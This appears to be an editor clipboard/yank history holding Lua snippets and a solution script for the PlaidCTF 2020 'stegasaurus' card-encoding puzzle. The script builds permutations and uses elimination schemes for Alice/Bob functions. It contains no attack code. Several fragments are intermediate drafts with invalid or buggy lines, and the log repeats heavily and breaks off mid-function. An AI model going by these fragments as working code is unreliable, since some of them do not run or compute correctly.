010eadd91f1bef05ef6c2f4d24a4df3b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|181|9|V|lua
	        print(comb[j])
a27e5e1af965d23b5c1410036ec5ba2d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|155|9|V|lua
	        tmp_str = ""
	        for k = 1, #temp do
	            tmp_str = tmp_str .. temp[k]
	        end
2eed032e50c0cdccdc6526f40010a34d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|155|33|v|lua
	tmp_str
f2700b545510adaa703d093fdf3851f4|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|187|5|V|lua
	    print(combs[i])
6f12bc96e02b8a01032748cc42597cbc|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|188|1|V|lua
	    tmp_str
7b26427f40d2387514dea535e1f6bfe1|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|181|1|V|lua
	            for 
9bb952f12edf83c394278547c656e964|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|180|13|v|lua
	card_in_comb = 0
e7fcf8e49e39af3c66af246fdcf535df|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|180|13|V|lua
	             
3bc624b689121a69d36c0cd8e49efaaa|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|30|1|V|lua
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
6c084756b70b41c8bf84a2bfcdf94f20|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|192|34|v|lua
	max_num
2377113f4039d27af2cb63df241ed6a4|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|191|17|V|lua
	                pos = i + 1 
d3f288c6f2918c273ac0fb63ca48b57e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|191|1|V|lua
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
f33d021bd7429df91c94ecc587bca32a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|201|1|V|lua
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
3b75005e75974ca37a2128300e3735e2|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|207|17|v|lua
	temp_card
d014aef5b7d90b79e532b5b30500521b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|207|1|V|lua
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
6c15b0beac86260b82987e5a8ac8b4fb|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|247|9|V|lua
	        encoding = tostring(encoding)
7f0ed33ead3c9688027c61bb27f65bd6|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|263|32|v|lua
	sorted_hand
2aff3646a4008dc73d4d0862f8c8e7cb|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|203|1|V|lua
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] == 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
c2b706d299870570a86c84de78d77c82|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|288|13|V|lua
	            end
96e27d0b5c372100118414386d2bd4b8|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|203|1|V|lua
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] == 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
411b00a88da9e681dcbecd516b240baa|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|219|1|V|lua
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = factorial(hand_size - 1)
	            while counter > 0 do
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
	            end
f392b38b3948388f01684fd35982b0c1|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|317|1|V|lua
	        guess = 0
	        pos = 1
	        for idx = 1, #eliminated do
	            elim = eliminated[idx]
	            if elim == 0 then
	                if pos == real_pos then
	                    guess = idx
	                end
	                pos = pos + 1
	            end
	        end
b0006973dfe9750943d8bec605584ab7|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|316|1|V|lua
	        guess = 0
	        pos = 1
	        for idx = 1, #eliminated do
	            elim = eliminated[idx]
	            if elim == 0 then
	                if pos == real_pos then
	                    guess = idx
	                end
	                pos = pos + 1
	            end
caba248a4f31c06fd29eed9c37a61ab6|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|337|1|V|lua
	permutations(7)
a7084514e55c9601a49e6f81ed5c16ec|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|332|1|V|lua
	hand_size = 8
	total_cards = factorial(hand_size) + (hand_size - 1)
	val2perm = {}
	perm2val = {}
	count = 1
	permutations(7)
9480a8b95f57098cd65e7dba6a9eaf82|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|119|1|V|lua
	    if (n == 0) then
	        return 1
	    else
	        return n * factorial(n - 1)
	    end
d938bb605ee663f973e1bb45b50c9db3|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|345|1|V|lua
	print(factorial(4))
42e7ff6664c9aac6d7cfde6611395683|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|273|1|V|lua
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(7)
2063c1608d6e0baf80249c42e2be5804|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|351|12|v|lua
	value
533b900f67db8d5492383b783055afe8|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|354|5|V|lua
	    print(index, ": ", value)
52c58c173e83b64bf5f6e4af2fc3a904|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|358|1|V|lua
	print(#val2perm)
a9a0cf34f7fb6444253d073065565452|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|136|5|V|lua
	    print(num_str)
752b44fe725f12e196709d59e40104fc|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|136|5|V|lua
	    print(a[i])
f47ff8ec6d5e21b805548d3df35b629a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|136|5|V|lua
	    print(num[i])
2177ef0e2a3f9abe474b328e045ae333|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|135|9|V|lua
	        print(num[i])
eed79c4e5a69b24bece896031ae50bdd|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|137|5|V|lua
	    print(val2perm[count])
c5da08fff3c4ad31348601181eb5dddf|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|136|5|V|lua
	    print(count)
9ded9c34a46c252bf1c3d2200dfe905a|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|67|15|V|python
	        print(len(sorted_comb))
	        print(int(pos) - 1)
accb35eeaa8e062db591e7dc7ab52a02|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|65|5|V|python
	    print(encoding)
6fc4a5fbd9219c26ba31cc07e2680538|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|259|55|v|lua
	idx_enc
da070dee1ab6c26c439910e28cfe01ab|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|248|21|V|lua
	                        print(val2perm[not_eliminated])
05f60ef4090f6059f489f947451b4d1b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|285|1|V|lua
	        index = index_of(card, sorted_hand) + 1
08343b85bce302e4422dda060ebb4f03|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|254|10|V|lua
	        sorted_comb = copy_table(final_comb)
	        table.sort(sorted_comb)
	        cards_to_return = {}
	        for idx_enc = 0, #encoding do
	            pos = encoding[idx[encoding]]
	            table.insert(cards_to_return, sorted_comb[pos - 1])
	        end
4a5b4a6d0bc4f219a1dc72ec4ab43b65|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|369|14|v|lua
	[1] = 36, [2] = 88, [3] = 55, [4] = 103, [5] = 34
0c80c92b05327ae466ef9a833950aa2b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|258|1|V|lua
	    for idx_enc = 0, #encoding do
9116e0890ecc2a17b22303baea798966|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|266|5|V|lua
	    print(#cards_to_return)
19ba7fb7abaa246fafe402d59722368e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|259|5|V|lua
	    print(#encoding)
b737efddb4b49f78e5138a784d611ad9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|270|1|V|lua
	    -- print(tmp)
f158cd450981fb854afb91b81093af52|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|264|5|V|lua
	    -- print(tmp_str)
01fb532fe25fd9bc0dfbb071fb4cdbe9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|293|5|V|lua
	        -- index = index_of(card, sorted_hand) + 1
7e8fa272b55baea0792c2bc0900ea7a1|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|264|5|V|lua
	    print(final_choice)
a950e3a1e196f57ccc610fc853e2770e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|1|V|lua
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	left_to_right = 1
	right_to_left = 0
	
	function search_arr(a, n, mobile)
	    for i = 0, n-1 do
	        if (a[i] == mobile) then
	            return(i+1)
	        end
	    end
	end
	
	function get_mobile(a, dir, n)
	    mobile_prev = 0
	    mobile = 0
	    for i = 0, n-1 do
	
	        if(dir[a[i] - 1] == right_to_left and i ~= 0) then
	            if(a[i] > a[i-1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	        if(dir[a[i]-1] == left_to_right and i ~= n-1) then
	            if(a[i] > a[i+1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	    end
	    if (mobile == 0 and mobile_prev == 0) then
	        return(0)
	    else
	        return(mobile)
	    end
	
	end
	
	function do_one_perm(a, dir, n)
	    mobile = get_mobile(a, dir, n)
	    pos = search_arr(a, n, mobile)
	
	    if (dir[a[pos - 1] - 1] == right_to_left) then
	        a[pos - 1], a[pos - 2] = a[pos - 2], a[pos - 1]
	    elseif(dir[a[pos - 1] - 1] == left_to_right) then
	        a[pos], a[pos - 1] = a[pos - 1], a[pos]
	    end
	
	    for i = 0, n-1 do
	        if (a[i] > mobile) then
	            if (dir[a[i] - 1] == left_to_right) then
	                dir[a[i] - 1] = right_to_left
	            elseif (dir[a[i] - 1] == right_to_left) then
	                dir[a[i] - 1] = left_to_right
	            end
	        end
	    end
	
	    num_str = ""
	    num = {}
	    for i =0, n-1 do
	        num_str = num_str .. a[i]
	        num[i] = a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	end
	
	function factorial(n)
	    fact = 1
	    for i = n, 1, -1 do
	        fact = fact * i
	    end
	    return fact
	end
	
	function permutations(n)
	    a = {}
	    dir = {}
	
	    num = {}
	    num_str = ""
	    for i = 0, n-1 do
	        a[i] = i+1
	        num[i] = i+1
	        num_str = num_str .. a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	
	    for i = 0, n-1 do
	        dir[i] = right_to_left
	    end
	
	    for i = 1, factorial(n) - 1 do
	        do_one_perm(a, dir, n)
	    end
	
	end
	
	function combinations(arr)
	    ret_array = {}
	    for i = 1, #arr do
	        local temp = {}
	        for j = 1, #arr do
	            if i ~= j then
	                table.insert(temp, arr[j]) 
	            end
	        end
	        table.insert(ret_array, temp)
	    end
	    return(ret_array)
	end
	
	function card_in_set(card, set)
	    for idx = 1, #set do
	        if set[idx] == card then
	            return(1)
	        end
	    end
	    return(0)
	end
	
	function copy_table(tab)
	    copied = {}
	    for idx = 1, #tab do
	        copied[idx] = tab[idx]
	    end
	    return(copied)
	end
	
	Alice1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        for i = 1, total_cards do
	            table.insert(eliminated, 0)
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            if eliminated[card] == 0 then
	                eliminated[card] = 1
	            else 
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
	            end
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = factorial(hand_size - 1)
	            while counter > 0 do
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
	            end
	        end
	        if eliminated[chosen] == 0 then
	            final_choice = chosen
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == 0) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
	                    not_eliminated = not_eliminated + 1
	                end
	            end
	        end
	    end
	    sorted_comb = copy_table(final_comb)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    tmp = ""
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
	    return(cards_to_return)
	end
	
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
	Bob1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    sorted_hand = copy_table(hand)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    eliminated = {}
	    for idx_elim = 1, factorial(hand_size) + (hand_size - 1) do
	        eliminated[idx_elim] = 0
	    end
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        if eliminated[card] == 0 then
	            eliminated[card] = 1
	        else
	            temp_card = card + 1
	            if (temp_card == total_cards + 1) then
	                temp_card = 1
	            end
	            elim = 0
	            while elim == 0 do
	                if eliminated[temp_card] == 0 then
	                    eliminated[temp_card] = 1
	                    elim = 1
	                end
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	        end
	        pos = card + 1
	        if (pos == total_cards + 1) then
	            pos = 1
	        end
	        counter = factorial(hand_size - 1)
	        while counter > 0 do
	            if eliminated[pos] == 0 then
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	            pos = pos + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	        end
	    end
	    guess = 0
	    pos = 1
	    for idx = 1, #eliminated do
	        elim = eliminated[idx]
	        if elim == 0 then
	            if pos == real_pos then
	                guess = idx
	                break
	            end
	            pos = pos + 1
	        end
	    end
	    return(guess)
	end
9e630cf2532cb495efd106a044a71eb0|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|1|V|lua
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	left_to_right = 1
	right_to_left = 0
	
	function search_arr(a, n, mobile)
	    for i = 0, n-1 do
	        if (a[i] == mobile) then
	            return(i+1)
	        end
	    end
	end
	
	function get_mobile(a, dir, n)
	    mobile_prev = 0
	    mobile = 0
	    for i = 0, n-1 do
	
	        if(dir[a[i] - 1] == right_to_left and i ~= 0) then
	            if(a[i] > a[i-1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	        if(dir[a[i]-1] == left_to_right and i ~= n-1) then
	            if(a[i] > a[i+1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	    end
	    if (mobile == 0 and mobile_prev == 0) then
	        return(0)
	    else
	        return(mobile)
	    end
	
	end
	
	function do_one_perm(a, dir, n)
	    mobile = get_mobile(a, dir, n)
	    pos = search_arr(a, n, mobile)
	
	    if (dir[a[pos - 1] - 1] == right_to_left) then
	        a[pos - 1], a[pos - 2] = a[pos - 2], a[pos - 1]
	    elseif(dir[a[pos - 1] - 1] == left_to_right) then
	        a[pos], a[pos - 1] = a[pos - 1], a[pos]
	    end
	
	    for i = 0, n-1 do
	        if (a[i] > mobile) then
	            if (dir[a[i] - 1] == left_to_right) then
	                dir[a[i] - 1] = right_to_left
	            elseif (dir[a[i] - 1] == right_to_left) then
	                dir[a[i] - 1] = left_to_right
	            end
	        end
	    end
	
	    num_str = ""
	    num = {}
	    for i =0, n-1 do
	        num_str = num_str .. a[i]
	        num[i] = a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	end
	
	function factorial(n)
	    fact = 1
	    for i = n, 1, -1 do
	        fact = fact * i
	    end
	    return fact
	end
	
	function permutations(n)
	    a = {}
	    dir = {}
	
	    num = {}
	    num_str = ""
	    for i = 0, n-1 do
	        a[i] = i+1
	        num[i] = i+1
	        num_str = num_str .. a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	
	    for i = 0, n-1 do
	        dir[i] = right_to_left
	    end
	
	    for i = 1, factorial(n) - 1 do
	        do_one_perm(a, dir, n)
	    end
	
	end
	
	function combinations(arr)
	    ret_array = {}
	    for i = 1, #arr do
	        local temp = {}
	        for j = 1, #arr do
	            if i ~= j then
	                table.insert(temp, arr[j]) 
	            end
	        end
	        table.insert(ret_array, temp)
	    end
	    return(ret_array)
	end
	
	function card_in_set(card, set)
	    for idx = 1, #set do
	        if set[idx] == card then
	            return(1)
	        end
	    end
	    return(0)
	end
	
	function copy_table(tab)
	    copied = {}
	    for idx = 1, #tab do
	        copied[idx] = tab[idx]
	    end
	    return(copied)
	end
	
	Alice1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        for i = 1, total_cards do
	            table.insert(eliminated, 0)
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            if eliminated[card] == 0 then
	                eliminated[card] = 1
	            else 
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
	            end
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = factorial(hand_size - 1)
	            while counter > 0 do
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
	            end
	        end
	        if eliminated[chosen] == 0 then
	            final_choice = chosen
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == 0) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
	                    not_eliminated = not_eliminated + 1
	                end
	            end
	        end
	    end
	    sorted_comb = copy_table(final_comb)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    tmp = ""
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
	    return(cards_to_return)
	end
	
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
	Bob1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    sorted_hand = copy_table(hand)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    eliminated = {}
	    for idx_elim = 1, factorial(hand_size) + (hand_size - 1) do
	        eliminated[idx_elim] = 0
	    end
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        if eliminated[card] == 0 then
	            eliminated[card] = 1
	        else
	            temp_card = card + 1
	            if (temp_card == total_cards + 1) then
	                temp_card = 1
	            end
	            elim = 0
	            while elim == 0 do
	                if eliminated[temp_card] == 0 then
	                    eliminated[temp_card] = 1
	                    elim = 1
	                end
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	        end
	        pos = card + 1
	        if (pos == total_cards + 1) then
	            pos = 1
	        end
	        counter = factorial(hand_size - 1)
	        while counter > 0 do
	            if eliminated[pos] == 0 then
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	            pos = pos + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	        end
	    end
	    guess = 0
	    pos = 1
	    for idx = 1, #eliminated do
	        elim = eliminated[idx]
	        if elim == 0 then
	            if pos == real_pos then
	                guess = idx
	                break
	            end
	            pos = pos + 1
	        end
	    end
	    return(guess)
	end
	
e66a915bf1a893ffc21c3405dcd38a8a|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|258|2|V|c
		if (1) {
475be47082b0430d6b27f93d4a0859a1|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	1:25:200419:stegasaurus::1WTNKYQCnRj+VCX3:000001cnE6
	
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	left_to_right = 1
	right_to_left = 0
	
	function search_arr(a, n, mobile)
	    for i = 0, n-1 do
	        if (a[i] == mobile) then
	            return(i+1)
	        end
	    end
	end
	
	function get_mobile(a, dir, n)
	    mobile_prev = 0
	    mobile = 0
	    for i = 0, n-1 do
	
	        if(dir[a[i] - 1] == right_to_left and i ~= 0) then
	            if(a[i] > a[i-1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	        if(dir[a[i]-1] == left_to_right and i ~= n-1) then
	            if(a[i] > a[i+1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	    end
	    if (mobile == 0 and mobile_prev == 0) then
	        return(0)
	    else
	        return(mobile)
	    end
	
	end
	
	function do_one_perm(a, dir, n)
	    mobile = get_mobile(a, dir, n)
	    pos = search_arr(a, n, mobile)
	
	    if (dir[a[pos - 1] - 1] == right_to_left) then
	        a[pos - 1], a[pos - 2] = a[pos - 2], a[pos - 1]
	    elseif(dir[a[pos - 1] - 1] == left_to_right) then
	        a[pos], a[pos - 1] = a[pos - 1], a[pos]
	    end
	
	    for i = 0, n-1 do
	        if (a[i] > mobile) then
	            if (dir[a[i] - 1] == left_to_right) then
	                dir[a[i] - 1] = right_to_left
	            elseif (dir[a[i] - 1] == right_to_left) then
	                dir[a[i] - 1] = left_to_right
	            end
	        end
	    end
	
	    num_str = ""
	    num = {}
	    for i =0, n-1 do
	        num_str = num_str .. a[i]
	        num[i] = a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	end
	
	function factorial(n)
	    fact = 1
	    for i = n, 1, -1 do
	        fact = fact * i
	    end
	    return fact
	end
	
	function permutations(n)
	    a = {}
	    dir = {}
	
	    num = {}
	    num_str = ""
	    for i = 0, n-1 do
	        a[i] = i+1
	        num[i] = i+1
	        num_str = num_str .. a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	
	    for i = 0, n-1 do
	        dir[i] = right_to_left
	    end
	
	    for i = 1, factorial(n) - 1 do
	        do_one_perm(a, dir, n)
	    end
	
	end
	
	function combinations(arr)
	    ret_array = {}
	    for i = 1, #arr do
	        local temp = {}
	        for j = 1, #arr do
	            if i ~= j then
	                table.insert(temp, arr[j]) 
	            end
	        end
	        table.insert(ret_array, temp)
	    end
	    return(ret_array)
	end
	
	function card_in_set(card, set)
	    for idx = 1, #set do
	        if set[idx] == card then
	            return(1)
	        end
	    end
	    return(0)
	end
	
	function copy_table(tab)
	    copied = {}
	    for idx = 1, #tab do
	        copied[idx] = tab[idx]
	    end
	    return(copied)
	end
	
	Alice1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        for i = 1, total_cards do
	            table.insert(eliminated, 0)
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            if eliminated[card] == 0 then
	                eliminated[card] = 1
	            else 
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
	            end
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = factorial(hand_size - 1)
	            while counter > 0 do
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
	            end
	        end
	        if eliminated[chosen] == 0 then
	            final_choice = chosen
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == 0) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
